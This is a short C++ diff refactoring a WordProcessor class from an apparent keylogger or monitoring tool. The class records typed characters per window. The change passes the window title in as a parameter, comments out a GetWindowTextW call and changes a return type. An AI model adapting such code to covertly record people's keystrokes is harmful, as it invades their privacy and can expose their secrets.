@@ -1,16 +1,17 @@
 #include "WordProcessor.h"
 
 WordProcessor::WordProcessor(IGuardProcessor* processor): processor(processor) {
+    app = NULL;
     editfeature = Poco::Util::Application::instance().config().getBool("application.keylogger.editfeatures", false);
 }
 
-void WordProcessor::process(Poco::Util::Application* _app, HWND window, std::wstring str) {
+void WordProcessor::process(Poco::Util::Application* _app, HWND window, std::string text, std::wstring str) {
     app = _app;
-    const int MAX_TITLE_LENGTH = 1024;
+   /* const int MAX_TITLE_LENGTH = 1024;
     wchar_t title[MAX_TITLE_LENGTH];
-    int length = GetWindowTextW(window, title, MAX_TITLE_LENGTH);
+    int length = GetWindowTextW(window, title, MAX_TITLE_LENGTH);*/
 
-    std::wstring wTitle(title);
+    std::wstring wTitle(text.begin(), text.end());
     Poco::SharedPtr<WindowInfo> sp1(new WindowInfo(app,wTitle, processor));
     Poco::SharedPtr<WindowInfo> sp2(sp1);
 
@@ -30,6 +31,6 @@ void WordProcessor::process(Poco::Util::Application* _app, HWND window, std::wst
         mapWindows.at(window)->addChar(str);
 }
 
-int WordProcessor::countWindow() {
+size_t WordProcessor::countWindow() {
     return mapWindows.size();
 }
